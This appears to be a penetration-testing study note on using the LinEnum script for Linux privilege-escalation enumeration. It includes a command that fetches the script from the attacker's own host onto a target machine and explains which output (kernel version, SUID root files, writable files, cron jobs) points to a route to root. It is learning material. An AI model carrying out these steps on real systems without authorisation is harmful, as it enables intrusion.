# LinEnum
* Performs command commands related to privilege escalation
* Must be placed onto target machine
	* A simple way to do this:
		* Option 1:
			* Local: `python -m SimpleHTTPServer 8000`
			* Remote: `wget MY-IP:8000/LinEnum.sh`
		* Option 2:
			* `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
		* Option 3:
			* Copy-Paste

## Commands
* To run: `./LinEnum.sh`

## Output
* Kernel
	* Kernel information
	* Likely that there is a kernel exploit if this is shown
* Can we read/write sensitive files
	* World-writable files are shown
* SUID Files
	* SUID = Set owner User ID up on execution
	* Permissions flag
	* If the owner of the file is root and we can run it, then bam! :)
* Crontab Contents
	* Conjobs are tasks that run at specific times
